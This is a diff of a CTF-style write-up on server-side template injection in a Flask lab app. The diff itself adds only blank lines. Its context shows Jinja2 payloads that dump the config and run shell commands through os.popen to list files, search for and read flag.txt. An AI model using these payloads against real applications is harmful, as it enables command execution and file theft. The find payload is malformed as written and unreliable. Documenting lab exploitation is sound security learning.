@@ -104,6 +104,7 @@ media_subpath: /assets/img/posts/garfield-ssti/
 ### Exploring the Environment
     Payload:{% raw %}/mylabs?word_5={{config}}{% endraw %}
  
+ 
  ![Config output](Garfield_2.png)
  
   This showed the Flask config object, but SECRET_KEY was None, so it was not useful.
@@ -112,12 +113,14 @@ media_subpath: /assets/img/posts/garfield-ssti/
 
 ### Listing Files
     Payload:{% raw %}/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}{% endraw %}
+
  ![ls output](Garfield_3.png)
 
  ---
 
 ### Searching for the Flag
     Payload:{% raw %}/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}{% endraw %}
+
  ![find output](Garfield_4.png)
 
   This revealed the presence of flag.txt.
@@ -126,6 +129,7 @@ media_subpath: /assets/img/posts/garfield-ssti/
 
 ### Reading the Flag
      Payload:{% raw %}/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}{% endraw %}
+
  ![flag output](Garfield_5.png)
 
  ---
